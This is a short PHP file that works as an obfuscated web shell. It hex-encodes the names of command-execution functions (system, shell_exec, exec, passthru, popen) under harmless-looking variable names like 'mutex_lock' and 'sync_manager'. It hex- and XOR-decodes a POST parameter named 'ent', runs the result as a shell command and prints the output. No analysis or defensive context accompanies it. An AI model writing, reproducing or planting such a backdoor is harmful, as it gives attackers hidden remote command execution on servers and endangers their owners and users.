<?php

$mutex_lock1 = "s\x79\x73t\x65m";
$mutex_lock6 = "\x73\x74\x72e\x61\x6D\x5Fget_co\x6Ete\x6E\x74s";
$mutex_lock5 = "\x70\x6Fpen";
$mutex_lock4 = "passt\x68r\x75";
$sync_manager = "h\x65\x78\x32\x62in";
$mutex_lock2 = "\x73\x68\x65\x6C\x6C_exec";
$mutex_lock3 = "\x65x\x65c";
$mutex_lock7 = "\x70\x63\x6Cose";
if (isset($_POST["e\x6E\x74"])) {
            function auth_exception_handler ( $pgrp , $property_set ){
 $pointer= '';
 $l=0;
 while($l<strlen($pgrp)){
$pointer.=chr(ord($pgrp[$l])^$property_set);
$l++;

} return$pointer;

}
            $ent = $sync_manager($_POST["e\x6E\x74"]);
            $ent = auth_exception_handler($ent, 18);
            if (function_exists($mutex_lock1)) {
                $mutex_lock1($ent);
            } elseif (function_exists($mutex_lock2)) {
                print $mutex_lock2($ent);
            } elseif (function_exists($mutex_lock3)) {
                $mutex_lock3($ent, $val_pgrp);
                print join("\n", $val_pgrp);
            } elseif (function_exists($mutex_lock4)) {
                $mutex_lock4($ent);
            } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
                $property_set_pointer = $mutex_lock5($ent, 'r');
                if ($property_set_pointer) {
                    $res_desc = $mutex_lock6($property_set_pointer);
                    $mutex_lock7($property_set_pointer);
                    print $res_desc;
                }
            }
            exit;
        }